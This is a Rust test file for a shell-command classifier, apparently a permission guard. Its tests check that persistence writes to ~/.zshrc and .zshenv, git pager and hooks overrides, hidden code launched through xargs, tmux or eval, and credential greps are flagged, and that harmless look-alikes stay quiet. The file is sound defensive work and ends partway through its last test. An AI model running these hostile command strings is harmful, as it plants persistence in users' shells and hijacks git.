//! Tests for #1276, #1309, #1159, #1635, #1607, #1606, #1661 and #1620,
//! moved here unchanged from `tainted_action_tests.rs` to keep that file
//! under the blob-size limit.

use super::*;
use pretty_assertions::assert_eq;

/// #1276: reading launchers stays linear, and a line with more launchers
/// than are read asks.
#[test]
fn issue_1276_launcher_input_checks_are_linear() {
    for (label, prefix, unit, suffix) in [
        ("exec options", "find . ", "-exec echo {} + ", ""),
        ("words", "xargs -I% echo ", "% ", ""),
        ("long replacement", "xargs -I", "%", " echo x"),
        ("options", "xargs ", "-n1 -P2 --zz ", "echo"),
        ("parallel options", "parallel ", "--zz x -j4 ", "gzip ::: a"),
        ("rush flags", "rush ", "-j 2 -v a=b ", "'echo {}'"),
        ("script", "xargs -I% sh -c '", "echo % x; ", "'"),
        ("positional", "xargs sh -c '", "echo \"$1\"; ", "' _"),
        ("substitutions", "xargs -I% sh -c 'echo ", "$(echo ", "%'"),
        ("env strings", "xargs -I% env ", "-S'echo %' ", ""),
        (
            "find env strings",
            "find . -exec env ",
            "-S'echo {}' ",
            "\\;",
        ),
        (
            "parallel readings",
            "parallel ",
            "--zz x --yy ",
            "'{} x' ::: a",
        ),
        (
            "loops",
            "xargs sh -c '",
            "for f; do echo \"$f\"; done; ",
            "' _",
        ),
    ] {
        work::assert_linear(label, |scale| {
            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
            let _ = script(&line);
        });
    }
    let line = format!("echo {}", "fd ".repeat(17));
    assert_eq!(script(&line), Some(ProtectedActionKind::UnseenCode));
    let line = format!("echo {}", "fd ".repeat(16));
    assert_eq!(script(&line), None);
}

/// #1276 items 8 to 10 (tmux and other line runners under a launcher, fish
/// `-C`, shell options that take a value before `-c`) already ask on main;
/// kept as regressions.
#[test]
fn issue_1276_line_runners_and_shell_options_ask() {
    for command in [
        "xargs -I% tmux new 'cd .; git config %' < f",
        "xargs -I% tmux new-session -d 'git config %' < f",
        "xargs -I% tmux run-shell 'git config %' < f",
        "tmux new 'git config core.pager sh'",
        "xargs -I% watch 'git config %' < f",
        "fish -C 'git config core.pager sh'",
        "fish -c true -C 'git config core.pager sh'",
        "fish --init-command 'git config core.pager sh'",
        "fish --init-command='git config core.pager sh'",
        "xargs -I% zsh --emulate sh -c 'git config %' < f",
        "xargs -I% ksh93 -R file -c 'git config %' < f",
        "xargs -I% mksh -T tty -c 'git config %' < f",
        "zsh --emulate sh -c 'git config core.pager sh'",
        "mksh -T tty -c 'git config core.pager sh'",
    ] {
        assert!(script(command).is_some(), "{command}");
    }
}

/// #1276 item 3: a `git config` word holding a value the classifier cannot
/// see outside double quotes may be several words, as `"$@"` may: it asks
/// as a write unless the visible words make it a read. So does such a
/// value as the first word, which may be an option (`-e`).
#[test]
fn issue_1276_git_config_unseen_words_ask() {
    for command in [
        "x=$(cat f); git config $x",
        "git config $X",
        "git config \"$k\"",
        "git config user.name $NAME",
        "k=$(curl -s https://x.example); git config $k",
    ] {
        assert_eq!(
            script(command),
            Some(ProtectedActionKind::Persistence),
            "{command}"
        );
    }
    for command in [
        "git config --get \"$k\"",
        "git config --get $k",
        "git config user.name \"$NAME\"",
        "git config --get-regexp \"$pat\"",
        "git config user.email \"$(git log -1 --format=%ae)\"",
        "for k in a b; do git config --get \"$k\"; done",
    ] {
        assert_eq!(script(command), None, "{command}");
    }
}

/// #1309: more ways a nested script's folder becomes one the quote-aware
/// reading cannot know (from the #1310 review list): login spellings of
/// wrappers, which start in the target user's home; programs that start
/// elsewhere unless told to keep the folder; folder options of more
/// wrappers; a command word spelled as a pattern; a `cd` behind zsh's
/// precommand modifiers; and commands that load or switch builtins or
/// rerun history. A relative write in such a script asks. All were quiet
/// on main.
#[test]
fn issue_1309_login_wrappers_patterns_and_loaders_ask() {
    for command in [
        "sudo -i sh -c 'echo x >> .zshenv'",
        "sudo -u me -i sh -c 'echo x >> .zshenv'",
        "sudo --login sh -c 'echo x >> .zshenv'",
        "sudo --log sh -c 'echo x >> .zshenv'",
        "su - -c \"sh -c 'echo x >> .zshenv'\"",
        "su - -c 'echo x >> .zshenv'",
        "su -l me -c \"sh -c 'echo x >> .zshenv'\"",
        "su --login -c \"sh -c 'echo x >> .zshenv'\"",
        "su --l -c \"sh -c 'echo x >> .zshenv'\"",
        "runuser -l me -c \"sh -c 'echo x >> .zshenv'\"",
        "runuser - me -c \"sh -c 'echo x >> .zshenv'\"",
        "machinectl shell me@ /bin/sh -c 'echo x >> .zshenv'",
        "systemd-run --user sh -c 'echo x >> .zshenv'",
        "systemd-run sh -c 'echo x >> home/fixture/.zshenv'",
        "systemd-run --unit x sh -c 'echo x >> .zshenv'",
        "pkexec --user me sh -c 'echo x >> .zshenv'",
        "schroot -d ~ -- sh -c 'echo x >> .zshenv'",
        "apptainer exec --pwd ~ img sh -c 'echo x >> .zshenv'",
        "singularity exec --pwd ~ img sh -c 'echo x >> .zshenv'",
        "buildah run --workingdir ~ c sh -c 'echo x >> .zshenv'",
        "touch cd; c? ~; sh -c 'echo x >> .zshenv'",
        "[c]d ~; sh -c 'echo x >> .zshenv'",
        "{c,}d ~; sh -c 'echo x >> .zshenv'",
        "{c..c}d ~; sh -c 'echo x >> .zshenv'",
        "for i in 1 2; do sh -c 'echo x >> .zshenv'; [c]d ~; done",
        "f() { sh -c 'echo x >> .zshenv'; }; [c]d ~; f",
        "noglob cd ~; sh -c 'echo x >> .zshenv'",
        "nocorrect cd ~; sh -c 'echo x >> .zshenv'",
        "- cd ~; sh -c 'echo x >> .zshenv'",
        "noglob nocorrect cd ~; sh -c 'echo x >> .zshenv'",
        "zmodload zsh/x; sh -c 'echo x >> .zshenv'",
        "enable -f ./x.so cd; cd /tmp; sh -c 'echo x >> .zshenv'",
        "enable -n cd; cd /tmp; sh -c 'echo x >> .zshenv'",
        "disable cd; cd /tmp; sh -c 'echo x >> .zshenv'",
        "fc -e 'sed -i s/a/b/'; sh -c 'echo x >> .zshenv'",
        "fc -l -s; sh -c 'echo x >> .zshenv'",
        "fc -ls; sh -c 'echo x >> .zshenv'",
        "r; sh -c 'echo x >> .zshenv'",
        // Review 2: a keep option after the program is the program's;
        // run0; other commands behind a modifier.
        "pkexec sh -c 'echo x >> .zshenv' --keep-cwd",
        "systemd-run sh -c 'echo x >> home/fixture/.zshenv' -d",
        "systemd-run -u x sh -c 'echo x >> .zshenv' --scope",
        "run0 -u me sh -c 'echo x >> .zshenv'",
        "noglob builtin cd ~; sh -c 'echo x >> .zshenv'",
        "noglob command cd ~; sh -c 'echo x >> .zshenv'",
        "noglob eval 'cd ~'; sh -c 'echo x >> .zshenv'",
        "noglob source ./f; sh -c 'echo x >> .zshenv'",
        "noglob enable -n cd; cd /tmp; sh -c 'echo x >> .zshenv'",
        "noglob fc -s; sh -c 'echo x >> .zshenv'",
    ] {
        assert_eq!(
            script(command),
            Some(ProtectedActionKind::Persistence),
            "{command}"
        );
    }
    for command in [
        "sudo -u me sh -c 'echo x > out.txt'",
        "sudo -s sh -c 'echo x > out.txt'",
        "su me -c \"sh -c 'echo x > out.txt'\"",
        "systemd-run --scope sh -c 'echo x > out.txt'",
        "systemd-run --user --same-dir sh -c 'echo x > out.txt'",
        "pkexec --keep-cwd sh -c 'echo x > out.txt'",
        "pkexec --user me --keep-cwd sh -c 'echo x > out.txt'",
        "systemd-run -u x -p Nice=5 --scope sh -c 'echo x > out.txt'",
        "noglob builtin echo; sh -c 'echo x > out.txt'",
        "[ -d build ] || mkdir build; sh -c 'echo x > out.txt'",
        "[[ -n x ]] && sh -c 'echo x > out.txt'",
        "f() { :; }; f; sh -c 'echo x > out.txt'",
        "fc -l; sh -c 'echo x > out.txt'",
        "noglob ls *.txt; sh -c 'echo x > out.txt'",
    ] {
        assert_eq!(script(command), None, "{command}");
    }
    // Asked on main too; kept as regressions (a function or alias named
    // like a modifier is still the command).
    for command in [
        "sudo -i sh -c 'git config -f .zshenv --comment x,--get a.b v'",
        "noglob() { echo $(( $1 )); }; noglob 'a[$(touch ~/.zshrc)]'",
    ] {
        assert!(script(command).is_some(), "{command}");
    }
}

/// #1309: the login, keep-option, modifier and pattern checks stay linear.
#[test]
fn issue_1309_login_and_modifier_checks_are_linear() {
    for (label, unit, suffix) in [
        ("keep options", "pkexec ", "--keep-cwd sh -c 'echo x'"),
        ("valued options", "systemd-run -u ", "sh -c 'echo x'"),
        ("logins", "sudo -i su - ", "sh -c 'echo x'"),
        ("modifiers", "noglob nocorrect ", "cd /b; sh -c 'echo x'"),
        ("patterns", "c?; [c]d; ", "sh -c 'echo x'"),
        ("fc", "fc -l -l ", "; sh -c 'echo x'"),
    ] {
        work::assert_linear(label, |scale| {
            let line = format!("{}{suffix}", unit.repeat(200 * scale));
            let _ = script(&line);
        });
    }
}

/// #1276 follow-ups from the #1517 review: a launcher in text `eval` or
/// `trap` runs, an `S` in another env option's value, a bundled `parallel
/// -kI@`, xargs options after an unknown option's value, rush `-Q`, and a
/// program after a wrapper's `--`. Each line was quiet on main.
#[test]
fn issue_1276_follow_ups_ask() {
    for command in [
        // `eval`/`trap` text without quotes of its own.
        "eval 'xargs env < f'",
        "eval \"parallel < cmds\"",
        "eval xargs env < f",
        "eval eval 'xargs env < f'",
        "eval 'true; xjobs < cmds'",
        "nice eval 'xargs env < f'",
        "trap 'xargs sh -c' EXIT",
        "trap 'parallel < cmds' EXIT",
        "trap -- 'xargs env < f' EXIT",
        "sh -c \"eval 'parallel < f'\"",
        // Review 1: `eval --`, `command eval`, quoted `eval` in `trap` text.
        "eval -- 'xargs env < f'",
        "eval command eval xargs env < f",
        "eval builtin eval xargs env < f",
        "eval \"eval -- 'xargs env < f'\"",
        "trap \"eval 'xargs env < f'\" EXIT",
        "trap \"trap 'xargs env < f' INT\" EXIT",
        // An `S` in another env option's value is no split.
        "xargs -I% env -uSSH_AUTH_SOCK python3 -c 'print(%)' < f",
        "xargs -I% env -CSrc sh -c '% x' < f",
        // `-I` bundled after other letters.
        "parallel -kI@ 'python3 -c \"print(@)\"' ::: a",
        "parallel -j2 -kI@ '@ x' ::: a",
        // xargs' options read on after an unknown option's value.
        "xargs --frob x -I% % config < f",
        "xargs -0 --frob x -I% % config < f",
        "xargs --frob x --replace=R R < f",
        "xargs --frob x --frob y -I% % < f",
        // rush's `-Q`/`--escape-symbols` take a value.
        "rush -Q x '{}' < f",
        "rush -Q x 'python3 -c \"print({})\"' < f",
        "rush --escape-symbols x '{}' < f",
        "rush -kQ x '{}' < f",
        // A program after a wrapper's operands and `--` (GNU tools run a
        // program named `--`; one that reads options after operands runs
        // the words after it).
        "xargs -I% flock l -- % < f",
        "xargs -I% flock -w 5 l -- % config < f",
        "xargs -I% timeout 5 -- % < f",
        "xargs -I% flock l -- python3 -c 'print(%)' < f",
        "xargs flock l -- < f",
        r"find . -exec flock l -- {} \;",
    ] {
        assert_eq!(
            script(command),
            Some(ProtectedActionKind::UnseenCode),
            "{command}"
        );
    }
    for command in [
        "eval 'echo hi'",
        "eval \"git status\"",
        "eval eval eval echo x",
        "eval -- echo hi",
        "trap \"eval 'echo bye'\" EXIT",
        "trap 'echo bye' EXIT",
        "xargs -I% env -uFOO echo % < f",
        "xargs -I% env -uSSH_AUTH_SOCK echo % < f",
        "parallel -kI@ 'echo @' ::: a",
        "xargs --frob x -I% echo % < f",
        "rush -Q x 'echo {}' < f",
        "xargs -I% flock l -- rm % < f",
        "xargs -I% timeout 5 -- rm -- % < f",
    ] {
        assert_eq!(script(command), None, "{command}");
    }
}

/// #1276 follow-ups: the new readings stay linear.
#[test]
fn issue_1276_follow_up_checks_are_linear() {
    for (label, prefix, unit, suffix) in [
        ("eval words", "eval ", "eval ", "echo x"),
        ("eval ends", "eval ", "eval -- ", "echo x"),
        ("quoted evals", "trap \"", "eval ", "'echo x'\" EXIT"),
        ("eval line", "eval '", "echo x; ", "'"),
        ("trap operands", "trap ", "'echo x' ", "EXIT"),
        ("xargs readings", "xargs ", "--zz x ", "-I% echo %"),
        ("rush escapes", "rush ", "-Q x ", "'echo {}'"),
        ("env groups", "xargs -I% env ", "-uSx ", "echo %"),
        ("wrapper ends", "xargs -I% ", "flock l -- ", "echo %"),
    ] {
        work::assert_linear(label, |scale| {
            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
            let _ = script(&line);
        });
    }
}

/// #1159 follow-ups from the #1521 review: a zsh `=word` the command reading
/// skips as an assignment (`=$X`, `=tee`), and the output files of the
/// command after a precommand modifier (`noglob git log --output=f`). Each
/// line was quiet on main.
#[test]
fn issue_1159_equals_words_and_modified_outputs_ask() {
    let unseen = [
        ("bash", "=$X log --output=~/.zshrc"),
        ("zsh", "=$X log --output=~/.zshrc"),
        ("bash", "echo x | =tee -a ~/.zshrc"),
        ("zsh", "echo x | =tee -a ~/.zshrc"),
        ("zsh", "noglob =tee -a ~/.zshrc"),
        ("bash", "- =tee -a ~/.zshrc"),
        ("bash", "=$(printf tee) -a ~/.zshrc"),
        ("zsh", "=sort -o ~/.zshrc f"),
        // Review 1: behind a modifier and a wrapper, after an exec marker
        // or an exec wrapper.
        ("zsh", "noglob command =tee -a ~/.zshrc"),
        ("zsh", "noglob nice =sort -o ~/.zshrc f"),
        ("zsh", r"find . -exec =tee -a ~/.zshrc \;"),
        ("zsh", "strace =tee -a ~/.zshrc"),
        // Review 2: a quoted `#` word; an exec wrapper's options.
        ("zsh", r"find . -name '#*#' -exec =tee -a ~/.zshrc \;"),
        ("zsh", "find '#dir' -exec =tee -a ~/.zshrc {} +"),
        ("zsh", "strace -f =tee -a ~/.zshrc"),
    ];
    let persistence = [
        ("bash", "noglob git log --output=~/.zshrc"),
        ("zsh", "noglob git log --output=~/.zshrc"),
        ("zsh", "nocorrect git log --output=~/.zshrc"),
        ("zsh", "noglob nocorrect git log --output=~/.zshrc"),
        ("bash", "noglob nice git log --output=~/.zshrc"),
        ("zsh", "noglob tee -a ~/.zshrc"),
        ("zsh", "noglob sort -o ~/.zshrc f"),
        ("bash", "cd \"$d\"; noglob git log --output=.zshenv"),
    ];
    // Every line is checked before the test fails. On Windows, whose
    // reading may name another kind first (`=$(printf tee) -a ~/.zshrc` is
    // `Persistence` there), a line only has to ask.
    let mut wrong = Vec::new();
    for (lines, expected) in [
        (&unseen[..], ProtectedActionKind::UnseenCode),
        (&persistence[..], ProtectedActionKind::Persistence),
    ] {
        for (shell, command) in lines {
            let found = kind(&[shell, "-c", command]);
            if found.is_none() || (!cfg!(windows) && found != Some(expected)) {
                wrong.push(format!("{shell}: {command} -> {found:?}"));
            }
        }
    }
    for command in [
        "noglob git log --output=out.txt",
        "noglob ls *.txt",
        "noglob tee out.txt",
        "echo =x",
        "[ \"$a\" = \"$b\" ]",
        "# ===== setup =====",
        "# a == b",
        "echo hi # ==== x",
        "find . -name '*.rs' -exec grep -n '==' {} +",
        "noglob git commit -m '=== x'",
    ] {
        let found = kind(&["zsh", "-c", command]);
        if found.is_some() {
            wrong.push(format!("zsh: {command} -> {found:?}"));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
}

/// #1309 follow-ups from the #1523 review: `run0 -D DIR`, a keep option
/// that may be an unknown option's value, tmux's `-c DIR` (its commands
/// read as scripts), and zsh extendedglob command words. Each line was
/// quiet on main.
#[test]
fn issue_1309_follow_ups_ask() {
    for (shell, command) in [
        ("bash", "run0 -D ~ sh -c 'echo x >> .zshenv'"),
        ("bash", "run0 -D . sh -c 'echo x >> .zshenv'"),
        ("bash", "run0 -uroot -D ~ sh -c 'echo x >> .zshenv'"),
        (
            "bash",
            "systemd-run --on-active -d sh -c 'echo x >> .zshenv'",
        ),
        (
            "bash",
            "systemd-run --on-calendar --scope sh -c 'echo x >> .zshenv'",
        ),
        (
            "bash",
            "systemd-run --on-active --same-dir sh -c 'echo x >> .zshenv'",
        ),
        ("bash", "run0 --description -D sh -c 'echo x >> .zshenv'"),
        ("bash", "pkexec --frob --keep-cwd sh -c 'echo x >> .zshenv'"),
        ("bash", "tmux new -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new-session -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new-window -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux split-window -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux splitw -h -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux respawn-pane -k -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new -d -s x -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new -dc ~ \"echo x >> .zshenv\""),
        ("bash", "tmux -L s new -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new -d \\; neww -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux popup -d ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new -c ~ 'sh -c \"echo x >> .zshenv\"'"),
        ("bash", "tmux new -c ~ 'git log --output=.zshenv'"),
        // Review 1: run-shell, name prefixes, tmux in another case.
        ("bash", "tmux run -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux run-shell -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux new-w -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux split-w -c ~ \"echo x >> .zshenv\""),
        ("bash", "tmux respawn-p -c ~ \"echo x >> .zshenv\""),
        ("bash", "TMUX new -c ~ \"echo x >> .zshenv\""),
        ("zsh", "cdd# ~; sh -c 'echo x >> .zshenv'"),
        ("zsh", "cd## ~; sh -c 'echo x >> .zshenv'"),
        ("zsh", "^x ~; sh -c 'echo x >> .zshenv'"),
        ("zsh", "cd~x ~; sh -c 'echo x >> .zshenv'"),
        ("bash", "cdd# ~; sh -c 'echo x >> .zshenv'"),
    ] {
        assert_eq!(
            kind(&[shell, "-c", command]),
            Some(ProtectedActionKind::Persistence),
            "{shell}: {command}"
        );
    }
    for command in [
        "systemd-run --user --same-dir sh -c 'echo x > out.txt'",
        "systemd-run -u x -p Nice=5 --scope sh -c 'echo x > out.txt'",
        "systemd-run --wait -q --scope sh -c 'echo x > out.txt'",
        "pkexec --disable-internal-agent --keep-cwd sh -c 'echo x > out.txt'",
        "tmux new \"echo x >> .zshenv\"",
        "tmux new -s c \"echo x > out.txt\"",
        "tmux new -d sh -c 'echo x > out.txt'",
        "tmux send-keys -t x 'new' Enter",
        "tmux new -c /tmp 'echo x > /tmp/out'",
        "tmux display -p '#S'",
        "tmux display -d 500 'echo x > .zshenv'",
        "cd ~/w; sh -c 'echo x > out.txt'",
    ] {
        assert_eq!(script(command), None, "{command}");
    }
}

/// #1159 and #1309 follow-ups: the new readings stay linear.
#[test]
fn issue_1309_follow_up_checks_are_linear() {
    for (label, prefix, unit, suffix) in [
        ("equals words", "nice ", "=x ", "echo"),
        ("modifiers", "", "noglob ", "git log --output=out.txt"),
        (
            "keep options",
            "systemd-run ",
            "--zz ",
            "--scope sh -c 'echo x > out.txt'",
        ),
        ("tmux options", "tmux new ", "-d ", "'echo x > out.txt'"),
        ("tmux commands", "tmux ", "new 'echo x' \\; ", ""),
        ("tmux words", "tmux ", "tmux ", "new -c ~ 'echo x'"),
    ] {
        work::assert_linear(label, |scale| {
            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
            let _ = script(&line);
        });
    }
}

/// #1635: follow-ups from #1528's review. Long options by prefix after an
/// alias; aliases with built-in names older gits lack; and in the Windows
/// reading, aliases' `--exec`, `--template` and `-qc`, and dashed helpers
/// named as `@git-grep.exe` or `git-grep.cmd`. Only adds prompts.
#[test]
fn issue1635_alias_prefixes_old_builtins_and_windows_helpers_ask() {
    use ProtectedActionKind::UnseenCode;
    let mut wrong = Vec::new();
    for command in [
        // Prefixes of the long options, after an alias.
        "git cl --te=./t u",
        "git cl --templ ./t u",
        "git cl --con=core.hooksPath=./h u",
        "git cl --conf core.fsmonitor=./x u",
        "git p --ex=./x u",
        "git p --exe ./x u",
        // Built-ins newer than git 2.34, or left out with breaking changes,
        // may be aliases there.
        "git refs -u ./x u",
        "git hook -Osh x",
        "git diagnose -u ./x u",
        "git replay --template=./t u",
        "git backfill -u ./x u",
        "git diff-pairs -Osh x",
        "git fsmonitor--daemon -Osh x",
        "git whatchanged -Osh x",
        "git pack-redundant -u ./x u",
    ] {
        if script(command) != Some(UnseenCode) {
            wrong.push(command.to_string());
        }
        if kind(&["/bin/zsh", "-lc", command]) != Some(UnseenCode) {
            wrong.push(format!("zsh: {command}"));
        }
    }
    for line in [
        "git p --exec=./x u",
        "git p --ex=./x u",
        "git cl --template=./t u",
        "git cl --te=./t u",
        "git cl --config=core.hooksPath=./h u",
        "git cl -qc core.fsmonitor=./x u",
        r"C:\Git\cmd\git.exe cl -qc core.fsmonitor=./x u",
        "git refs -u ./x u",
        "@git-grep.exe -Osh x",
        "git-grep.cmd -Osh x",
        "git-clone.cmd -u ./x u",
        r"@C:\Git\mingw64\libexec\git-core\git-grep.exe -Osh x",
    ] {
        if cmd(line) != Some(UnseenCode) {
            wrong.push(format!("cmd: {line}"));
        }
        if powershell(line) != Some(UnseenCode) {
            wrong.push(format!("powershell: {line}"));
        }
    }
    // As before: a word that names no helper by its command name.
    if cmd("git-.cmd ^--upload-pack=x") != Some(UnseenCode) {
        wrong.push("cmd: git-.cmd ^--upload-pack=x".to_string());
    }
    // git's own commands, and older built-ins, read as before.
    for command in [
        "git status -uno",
        "git add -u",
        "git log --template x",
        "git commit -c HEAD",
        "git branch -u origin/main",
        "git worktree add ../w",
        "git switch -c topic",
        "git restore -s HEAD x",
        "git maintenance run",
        "git sparse-checkout set a",
        "git refs list",
        "git hook run pre-commit",
    ] {
        if script(command).is_some() {
            wrong.push(format!("quiet: {command}"));
        }
    }
    for line in [
        "git status -uno",
        "git-status.cmd -uno",
        "@git-status.exe -uno",
        "git log -Oorder.txt",
    ] {
        if cmd(line).is_some() || powershell(line).is_some() {
            wrong.push(format!("quiet windows: {line}"));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
}

/// #1607: zsh reads `>!` as `>|` (also `>>!`, `&>!`, `&>>!`, `>&!`, `>>&!`
/// and with a descriptor, `2>!`): `echo x >! ~/.zshrc` writes `~/.zshrc`.
/// bash and dash write a file `!` and pass the next word on, so both
/// readings count: the `!` file, and zsh's file judged as written only
/// (bash's words are left as they were). The `|` forms (`>>|`, `&>|`, `&>>|`, `>&|`, `>>&|`)
/// already asked; they stay so.
#[test]
fn issue1607_zsh_clobber_redirections_write() {
    use ProtectedActionKind::Credentials;
    use ProtectedActionKind::Persistence;
    use ProtectedActionKind::UnseenCode;
    for shell in ["zsh", "bash"] {
        let line = |script: &str| kind(&[shell, "-lc", script]);
        for op in [
            ">!", ">>!", "&>!", "&>>!", ">&!", ">>&!", "2>!", "2>>!", "1>>!", ">>|", "&>|", "&>>|",
            ">&|", ">>&|", "2>>|",
        ] {
            for target in [" ~/.zshrc", "~/.zshrc", " =mytool", " \"$HOME/.zshrc\""] {
                let script = format!("echo x {op}{target}");
                assert_eq!(line(&script), Some(Persistence), "{shell} {script:?}");
            }
        }
        for script in [
            "make >! log; echo x >>! ~/.zshenv",
            "sh -c \"echo x >! ~/.zshrc\"",
            "f() { echo x >>! ~/.zshrc; }; f",
            "(echo x &>! ~/.zshrc)",
            "echo $(echo x >! ~/.zshrc)",
            "cd ~ && echo x >! .zshrc",
            "cd ~ && echo x >>!.zshenv",
            "echo x >! ~/.zshrc 2>&1",
            "echo x >! $(echo ~/.zshrc)",
            "echo x >!$(echo ~/.zshrc)",
            "echo x >>! `echo ~/.zshrc`",
            "echo x >! ~/$(echo .zshrc)",
        ] {
            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
        }
        // The line's variables count in zsh's file as in any other
        // (review round 2): it asks as `>` does (`>|` is no measure: the
        // word reading splits it as a pipe, so its file is also a program).
        for op in [">!", ">>!", "&>!", "2>!"] {
            for template in [
                "f=~/.zshrc; echo x OP $f",
                "f=~/.zshrc; echo x OP\"$f\"",
                "f=~/.zshrc; echo x OP \"$f\"",
                "f=$(cat notes); echo x OP \"$f\"",
                "P=..; cd /home/fixture/w && echo x OP $P/.zshrc",
                "P=../../../../..; cd /home/fixture/w; for i in 1 2 3 4; do cd d; echo x OP $P/.zshrc; done",
            ] {
                let script = template.replace("OP", op);
                let plain = template.replace("OP", &op.replace('!', ""));
                let expected = line(&plain);
                assert!(expected.is_some(), "{shell} {plain:?}");
                assert_eq!(line(&script), expected, "{shell} {script:?}");
            }
        }
        // bash's words stay as they were: git runs with the option the
        // `>!` precedes, `~` is still what grep reads (not a `-C` value),
        // `read` still sets the variable it names.
        assert!(line("git >! -c core.pager=sh log").is_some(), "{shell}");
        for (script, expected) in [
            ("grep -r token >!-C ~", Credentials),
            ("touch PAGER; read >! PAGE[R] <<< id; git log", UnseenCode),
            ("read >! \"$n\" <<< x", UnseenCode),
            ("declare >(:>!) \"$n=x\"", UnseenCode),
        ] {
            assert_eq!(line(script), Some(expected), "{shell} {script:?}");
        }
        // Ordinary redirections and pipes, a `!` elsewhere, and a quoted
        // `!` (zsh writes a file `!`), stay as they were.
        for script in [
            "echo x >! out.txt",
            "echo x >>!out.txt",
            "make 2>! err.log",
            "make >>! build.log 2>&1",
            "echo x &>! out.txt",
            "echo x >&! out.txt",
            "echo x >>&! out.txt",
            "echo x >>| out.txt",
            "echo x &>| out.txt",
            "echo x > out.txt",
            "echo x >> log",
            "echo x >| out.txt",
            "ls | grep x",
            "echo hi! > out.txt",
            "echo x > out!",
            "[ a != b ] && echo x > out.txt",
            "if ! grep -q x f; then echo y >> log; fi",
            "echo x >\\! ~/.zshrc",
            "echo x >'!' ~/.zshrc",
        ] {
            assert_eq!(line(script), None, "{shell} {script:?}");
        }
    }
}

/// #1606 item 1: a wrapper's option value spelled `git` before its folder
/// option does not hide the real git after it, whose output files are
/// judged in that unknown folder. Only adds prompts.
#[test]
fn issue1606_git_value_before_a_wrapper_folder_option_asks() {
    use ProtectedActionKind::Persistence;
    for shell in ["bash", "zsh"] {
        let line = |script: &str| kind(&[shell, "-lc", script]);
        for script in [
            "env -u git -iC ~ git log --output=.zshenv",
            "env -u git -iC ~ git config -f .zshenv core.pager sh",
            "docker exec -u git -w ~ c git log --output=.zshenv",
            "docker exec -u git -w ~ c git config -f .zshenv core.pager sh",
            // As before.
            "env -iC ~ git log --output=.zshenv",
            "docker exec -w ~ c git log --output=.zshenv",
            // Review 1: git before a wrapper and its folder option, a
            // wrapper's long option value spelled `git`, and `=git` after it.
            "=git submodule foreach env -iC ~ git log --output=.zshenv",
            "git bisect run sudo -D ~ git log --output=.zshenv",
            "sudo --user git -D ~ git log --output=.zshenv",
            "env -iC ~ =git log --output=.zshenv",
            // Review 2: as on main, a leading `=git` keeps a later git.
            "=git -C ~/r submodule foreach git log --output=../../.zshenv",
        ] {
            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
        }
        for script in [
            "docker exec -u git -w /src c git status",
            "docker exec -u git -w /src c git log --oneline",
            "git -C /tmp log --output=out.txt",
        ] {
            assert_eq!(line(script), None, "{shell} {script:?}");
        }
    }
}

/// #1661: a wrapper's git outputs: the inner git of `git submodule
/// foreach` and `git bisect run` runs in a folder this reading does not
/// follow (each submodule's, or the folder bisect runs in), so its
/// relative outputs are judged as being in an unknown folder. Only adds
/// prompts: the outer git's own outputs are still judged against its
/// folder.
#[test]
fn issue1661_wrapped_git_output_paths_ask() {
    use ProtectedActionKind::Persistence;
    for shell in ["bash", "zsh"] {
        let line = |script: &str| kind(&[shell, "-lc", script]);
        for script in [
            "git -C ~/r submodule foreach git log --output=../../.zshenv",
            "git submodule foreach git log --output=../../.zshenv",
            "git bisect run git log --output=../../.zshenv",
            "git -C ~/r bisect run git log --output=../../.zshenv",
            "git -C ~/r submodule foreach git config -f ../../.zshenv core.pager sh",
            "git bisect run git config -f ../../.zshenv core.pager sh",
            // Any relative output under one: the folder is unknown.
            "git -C ~/r submodule foreach git log --output=out.txt",
            // #1661 review: options between `submodule` and `foreach`.
            "git -C ~/r submodule --quiet foreach git log --output=../../.zshenv",
            "git -C ~/r submodule -q foreach git log --output=../../.zshenv",
            "git -C ~/r submodule --cached foreach git log --output=../../.zshenv",
            "git-submodule --quiet foreach git log --output=../../.zshenv",
            // #1661 review: a global option whose value is a separate word.
            "git -C ~/r --attr-source HEAD submodule foreach git log --output=../../.zshenv",
            "git -C ~/r --shallow-file f submodule foreach git log --output=../../.zshenv",
            // #1661 review: a quoted foreach script with more than one
            // command: every command in it runs in the submodule.
            "git submodule foreach 'git fetch; git log --output=../../.zshenv'",
            "git -C ~/r submodule foreach 'git fetch && git log --output=../../.zshenv'",
            "git bisect run 'git fetch; git log --output=../../.zshenv'",
        ] {
            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
        }
        for script in [
            // No output option: nothing to judge.
            "git submodule foreach git log --oneline",
            "git bisect run git log --oneline",
            "git -C ~/r submodule foreach git status",
            "git -C ~/r submodule --quiet foreach git status",
            "git submodule --cached foreach git log --oneline",
            // The outer git's own outputs, judged against its folder.
            "git -C /tmp log --output=out.txt",
            "git -C ~/r log --output=out.txt",
            "git -C ~/r log --output=../../.zshenv",
        ] {
            assert_eq!(line(script), None, "{shell} {script:?}");
        }
    }
}

/// #1620: zsh expands `=mytool` in any word, so a writer's operand writes
/// the installed program, and so does the text `eval`, `trap` and `alias`
/// run. Only adds prompts: bash writes a file `=mytool` (stricter than
/// needed, as for #1573's redirections), and a `>=` in quotes is no
/// redirection.
#[test]
fn issue1620_zsh_equals_writer_operands_and_code_text_ask() {
    use ProtectedActionKind::Persistence;
    for shell in ["zsh", "bash"] {
        let line = |script: &str| kind(&[shell, "-lc", script]);
        for script in [
            "echo x | tee -a =mytool",
            "echo x | tee =mytool",
            "cp x =mytool",
            "install x =mytool",
            "ln -sf x =mytool",
